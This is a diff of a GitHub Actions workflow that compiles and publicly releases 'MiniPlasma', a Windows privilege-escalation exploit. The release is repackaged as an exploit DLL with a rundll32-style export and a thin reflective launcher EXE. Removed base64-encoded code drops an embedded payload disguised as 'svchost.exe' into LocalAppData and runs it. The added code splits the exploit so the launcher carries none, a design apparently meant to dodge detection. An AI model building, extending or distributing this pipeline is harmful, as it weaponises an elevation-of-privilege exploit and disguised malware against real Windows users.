@@ -18,61 +18,47 @@ jobs:
       - name: Setup MSBuild
         uses: microsoft/setup-msbuild@v2
 
-      # ── Restore packages ───────────────────────────────────────────────────
       - name: Restore NuGet packages
         shell: pwsh
         run: |
           Remove-Item -Recurse -Force MiniPlasma\packages -ErrorAction SilentlyContinue
           nuget restore MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP.sln -PackagesDirectory MiniPlasma\packages
 
-      # ── EXE build ──────────────────────────────────────────────────────────
-      - name: Build EXE (Costura single-file)
-        run: >
-          msbuild MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP.sln
-          /p:Configuration=Release /p:Platform="Any CPU"
-          /p:SignManifests=false /p:Optimize=true
-
-      - name: Stage EXE
-        shell: pwsh
-        run: |
-          New-Item -ItemType Directory -Force staging | Out-Null
-          Copy-Item "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\bin\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.exe" staging\
-
-      # ── Embed EXE as resource, patch project for DLL build ────────────────
-      - name: Embed EXE into project and patch for DLL
+      # ── Patch project: DLL exploit + thin launcher EXE ────────────────────
+      - name: Patch project for DLL + launcher build
         shell: pwsh
         run: |
           $projDir = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP"
-          $exePath = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\bin\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
 
-          New-Item -ItemType Directory -Force "$projDir\Resources" | Out-Null
-          Copy-Item $exePath "$projDir\Resources\payload.bin" -Force
-          Write-Output "payload.bin: $((Get-Item "$projDir\Resources\payload.bin").Length) bytes"
+          # Stage0 uses Assembly.Location (DLL path) to spawn children — patch to use
+          # the running EXE path so the thin launcher is what gets spawned for Stage1/2/3.
+          $programCs = [IO.File]::ReadAllText("$projDir\Program.cs")
+          $patched = $programCs.Replace(
+              'typeof(Program).Assembly.Location',
+              'System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName')
+          if ($patched -eq $programCs) { Write-Output "WARNING: Stage0 patch string not found" }
+          else { Write-Output "Stage0 patched: Assembly.Location -> MainModule.FileName" }
+          [IO.File]::WriteAllText("$projDir\Program.cs", $patched, [Text.Encoding]::UTF8)
 
-          # Export.cs — base64-encoded to avoid YAML block-scalar issues
-          $exportB64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5JTzsKdXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247CnVzaW5nIFN5c3RlbS5UaHJlYWRpbmc7CnVzaW5nIFJHaWVzZWNrZS5EbGxFeHBvcnQ7CgpuYW1lc3BhY2UgUG9DX0Fib3J0SHlkcmF0aW9uX0FyYml0cmFyeVJlZ0tleV9Fb1AKewogICAgcHVibGljIGNsYXNzIERsbEVudHJ5UG9pbnQKICAgIHsKICAgICAgICBbRGxsRXhwb3J0KCJTdGFydCIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBTdGFydChJbnRQdHIgaHduZCwgSW50UHRyIGhpbnN0LCBzdHJpbmcgbHBzekNtZExpbmUsIGludCBuQ21kU2hvdykKICAgICAgICB7CiAgICAgICAgICAgIG5ldyBUaHJlYWQoUnVuUGF5bG9hZCkgeyBJc0JhY2tncm91bmQgPSB0cnVlIH0uU3RhcnQoKTsKICAgICAgICB9CgogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgUnVuUGF5bG9hZCgpCiAgICAgICAgewogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgc3RyaW5nIHN0b3JlRGlyID0gU3lzdGVtLklPLlBhdGguQ29tYmluZSgKICAgICAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5HZXRGb2xkZXJQYXRoKEVudmlyb25tZW50LlNwZWNpYWxGb2xkZXIuTG9jYWxBcHBsaWNhdGlvbkRhdGEpLAogICAgICAgICAgICAgICAgICAgICJNaWNyb3NvZnQiLCAiV2luZG93cyIsCiAgICAgICAgICAgICAgICAgICAgR3VpZC5OZXdHdWlkKCkuVG9TdHJpbmcoIk4iKS5TdWJzdHJpbmcoMCwgMTYpKTsKICAgICAgICAgICAgICAgIERpcmVjdG9yeS5DcmVhdGVEaXJlY3Rvcnkoc3RvcmVEaXIpOwogICAgICAgICAgICAgICAgc3RyaW5nIGV4ZVBhdGggPSBTeXN0ZW0uSU8uUGF0aC5Db21iaW5lKHN0b3JlRGlyLCAic3ZjaG9zdC5leGUiKTsKCiAgICAgICAgICAgICAgICBBc3NlbWJseSBhc20gPSB0eXBlb2YoRGxsRW50cnlQb2ludCkuQXNzZW1ibHk7CiAgICAgICAgICAgICAgICBzdHJpbmcgcmVzTmFtZSA9ICJQb0NfQWJvcnRIeWRyYXRpb25fQXJiaXRyYXJ5UmVnS2V5X0VvUC5SZXNvdXJjZXMucGF5bG9hZC5iaW4iOwogICAgICAgICAgICAgICAgdXNpbmcgKFN0cmVhbSBzcmMgPSBhc20uR2V0TWFuaWZlc3RSZXNvdXJjZVN0cmVhbShyZXNOYW1lKSkKICAgICAgICAgICAgICAgIHVzaW5nIChGaWxlU3RyZWFtIGRzdCA9IEZpbGUuQ3JlYXRlKGV4ZVBhdGgpKQogICAgICAgICAgICAgICAgICAgIHNyYy5Db3B5VG8oZHN0KTsKCiAgICAgICAgICAgICAgICBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzcy5TdGFydChuZXcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8oZXhlUGF0aCkgeyBVc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZSB9KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7IH0KICAgICAgICB9CiAgICB9Cn0="
+          # Export.cs: Start() routes to Program.Main based on lpszCmdLine arg
+          $exportB64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGhyZWFkaW5nOwp1c2luZyBSR2llc2Vja2UuRGxsRXhwb3J0OwoKbmFtZXNwYWNlIFBvQ19BYm9ydEh5ZHJhdGlvbl9BcmJpdHJhcnlSZWdLZXlfRW9QCnsKICAgIHB1YmxpYyBjbGFzcyBEbGxFbnRyeVBvaW50CiAgICB7CiAgICAgICAgW0RsbEV4cG9ydCgiU3RhcnQiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgU3RhcnQoSW50UHRyIGh3bmQsIEludFB0ciBoaW5zdCwgc3RyaW5nIGxwc3pDbWRMaW5lLCBpbnQgbkNtZFNob3cpCiAgICAgICAgewogICAgICAgICAgICBzdHJpbmdbXSBhcmdzID0gc3RyaW5nLklzTnVsbE9yRW1wdHkobHBzekNtZExpbmUpCiAgICAgICAgICAgICAgICA/IG5ldyBzdHJpbmdbMF0KICAgICAgICAgICAgICAgIDogbmV3IHN0cmluZ1tdIHsgbHBzekNtZExpbmUuVHJpbSgpIH07CiAgICAgICAgICAgIG5ldyBUaHJlYWQoKCkgPT4geyB0cnkgeyBQcm9ncmFtLk1haW4oYXJncyk7IH0gY2F0Y2ggeyB9IH0pIHsgSXNCYWNrZ3JvdW5kID0gdHJ1ZSB9LlN0YXJ0KCk7CiAgICAgICAgfQogICAgfQp9"
           [IO.File]::WriteAllBytes("$projDir\Export.cs", [Convert]::FromBase64String($exportB64))
 
-          # DllExportStub.cs — base64-encoded
+          # DllExportStub.cs
           $stubB64 = "bmFtZXNwYWNlIFJHaWVzZWNrZS5EbGxFeHBvcnQKewogICAgW1N5c3RlbS5BdHRyaWJ1dGVVc2FnZShTeXN0ZW0uQXR0cmlidXRlVGFyZ2V0cy5NZXRob2QpXQogICAgaW50ZXJuYWwgc2VhbGVkIGNsYXNzIERsbEV4cG9ydEF0dHJpYnV0ZSA6IFN5c3RlbS5BdHRyaWJ1dGUKICAgIHsKICAgICAgICBwdWJsaWMgRGxsRXhwb3J0QXR0cmlidXRlKHN0cmluZyBuYW1lKSB7IH0KICAgIH0KfQ=="
           [IO.File]::WriteAllBytes("$projDir\DllExportStub.cs", [Convert]::FromBase64String($stubB64))
 
+          # Patch csproj: add Export.cs and DllExportStub.cs
           $csprojPath = "$projDir\PoC_AbortHydration_ArbitraryRegKey_EoP.csproj"
           $csproj = [IO.File]::ReadAllText($csprojPath)
-
           $csproj = $csproj.Replace(
               '<Compile Include="Program.cs" />',
               '<Compile Include="DllExportStub.cs" /><Compile Include="Export.cs" /><Compile Include="Program.cs" />')
-
-          $csproj = $csproj.Replace(
-              '<None Include="App.config" />',
-              '<None Include="App.config" /><EmbeddedResource Include="Resources\payload.bin" />')
-
           [IO.File]::WriteAllText($csprojPath, $csproj, [Text.Encoding]::UTF8)
           Write-Output "Project patched"
 
-      # ── DLL build ─────────────────────────────────────────────────────────
-      - name: Build DLL (x64, payload.bin embedded)
+      # ── DLL build: full exploit with Start() export ────────────────────────
+      - name: Build DLL (x64, full exploit)
         run: >
           msbuild "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\PoC_AbortHydration_ArbitraryRegKey_EoP.csproj"
           /p:Configuration=Release /p:Platform=x64
@@ -147,23 +133,47 @@ jobs:
           & $ilasm @args
 
           if (Test-Path $outDll) {
+              New-Item -ItemType Directory -Force staging | Out-Null
               Copy-Item $outDll "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.dll"
               Write-Output "DLL staged: $((Get-Item "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.dll").Length) bytes"
           } else { throw "ilasm failed" }
+
+      # ── Build thin launcher EXE ────────────────────────────────────────────
+      - name: Build thin launcher EXE
+        shell: pwsh
+        run: |
+          $launcherDir = "MiniPlasma\Launcher"
+          New-Item -ItemType Directory -Force $launcherDir | Out-Null
+
+          # Launcher.cs: loads the DLL from same dir, calls Program.Main via reflection
+          $launcherB64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwoKY2xhc3MgTGF1bmNoZXIKewogICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgewogICAgICAgIHN0cmluZyBkbGxQYXRoID0gUGF0aC5Db21iaW5lKAogICAgICAgICAgICBQYXRoLkdldERpcmVjdG9yeU5hbWUoQXNzZW1ibHkuR2V0RXhlY3V0aW5nQXNzZW1ibHkoKS5Mb2NhdGlvbiksCiAgICAgICAgICAgICJQb0NfQWJvcnRIeWRyYXRpb25fQXJiaXRyYXJ5UmVnS2V5X0VvUC5kbGwiKTsKICAgICAgICB2YXIgYXNtID0gQXNzZW1ibHkuTG9hZEZpbGUoZGxsUGF0aCk7CiAgICAgICAgdmFyIHQgPSBhc20uR2V0VHlwZSgiUG9DX0Fib3J0SHlkcmF0aW9uX0FyYml0cmFyeVJlZ0tleV9Fb1AuUHJvZ3JhbSIpOwogICAgICAgIHZhciBtID0gdC5HZXRNZXRob2QoIk1haW4iLCBCaW5kaW5nRmxhZ3MuU3RhdGljIHwgQmluZGluZ0ZsYWdzLlB1YmxpYyB8IEJpbmRpbmdGbGFncy5Ob25QdWJsaWMpOwogICAgICAgIG0uSW52b2tlKG51bGwsIG5ldyBvYmplY3RbXSB7IGFyZ3MgfSk7CiAgICB9Cn0="
+          [IO.File]::WriteAllBytes("$launcherDir\Launcher.cs", [Convert]::FromBase64String($launcherB64))
+
+          # Launcher.csproj
+          $projB64 = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPFByb2plY3QgVG9vbHNWZXJzaW9uPSIxNS4wIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS9kZXZlbG9wZXIvbXNidWlsZC8yMDAzIj4KICA8SW1wb3J0IFByb2plY3Q9IiQoTVNCdWlsZEV4dGVuc2lvbnNQYXRoKVwkKE1TQnVpbGRUb29sc1ZlcnNpb24pXE1pY3Jvc29mdC5DU2hhcnAudGFyZ2V0cyIgLz4KICA8UHJvcGVydHlHcm91cD4KICAgIDxDb25maWd1cmF0aW9uPlJlbGVhc2U8L0NvbmZpZ3VyYXRpb24+CiAgICA8UGxhdGZvcm0+QW55Q1BVPC9QbGF0Zm9ybT4KICAgIDxPdXRwdXRUeXBlPkV4ZTwvT3V0cHV0VHlwZT4KICAgIDxUYXJnZXRGcmFtZXdvcmtWZXJzaW9uPnY0LjguMTwvVGFyZ2V0RnJhbWV3b3JrVmVyc2lvbj4KICAgIDxBc3NlbWJseU5hbWU+UG9DX0Fib3J0SHlkcmF0aW9uX0FyYml0cmFyeVJlZ0tleV9Fb1A8L0Fzc2VtYmx5TmFtZT4KICAgIDxPdXRwdXRQYXRoPmJpblxSZWxlYXNlXDwvT3V0cHV0UGF0aD4KICAgIDxPcHRpbWl6ZT50cnVlPC9PcHRpbWl6ZT4KICAgIDxTaWduTWFuaWZlc3RzPmZhbHNlPC9TaWduTWFuaWZlc3RzPgogIDwvUHJvcGVydHlHcm91cD4KICA8SXRlbUdyb3VwPgogICAgPENvbXBpbGUgSW5jbHVkZT0iTGF1bmNoZXIuY3MiIC8+CiAgICA8UmVmZXJlbmNlIEluY2x1ZGU9IlN5c3RlbSIgLz4KICA8L0l0ZW1Hcm91cD4KPC9Qcm9qZWN0Pg=="
+          [IO.File]::WriteAllBytes("$launcherDir\Launcher.csproj", [Convert]::FromBase64String($projB64))
+
+          msbuild "$launcherDir\Launcher.csproj" /p:Configuration=Release /p:Platform="Any CPU" /p:SignManifests=false
+
+          $exeOut = "$launcherDir\bin\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
+          if (Test-Path $exeOut) {
+              Copy-Item $exeOut "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
+              Write-Output "EXE staged: $((Get-Item "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.exe").Length) bytes"
+          } else { throw "Launcher EXE build failed" }
 
       - name: List staging
         shell: pwsh
         run: Get-ChildItem staging\ | Format-Table Name, Length
 
-      # ── Publish public release ─────────────────────────────────────────────
-      - name: Create GitHub Release (EXE + DLL)
+      # ── Publish release ────────────────────────────────────────────────────
+      - name: Create GitHub Release (EXE launcher + DLL payload)
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         shell: pwsh
         run: |
-          $tag = "v3.0-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
+          $tag = "v4.0-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
           gh release create $tag staging\* `
-            --title "MiniPlasma v3.0 - EXE + DLL (embedded payload)" `
-            --notes "DLL: x64, Start() export, EXE embedded as resource - extracted to LocalAppData on load (not TEMP, avoids Stage3 cleanup). EXE: Costura single-file." `
+            --title "MiniPlasma v4.0 - thin launcher EXE + exploit DLL" `
+            --notes "EXE: thin launcher (no exploit code, loads DLL via reflection). DLL: x64, full exploit, Start() export. Deploy both files together. Stage0 patched to spawn via GetCurrentProcess().MainModule.FileName." `
             --repo $env:GITHUB_REPOSITORY
           Write-Output "Release: $tag"
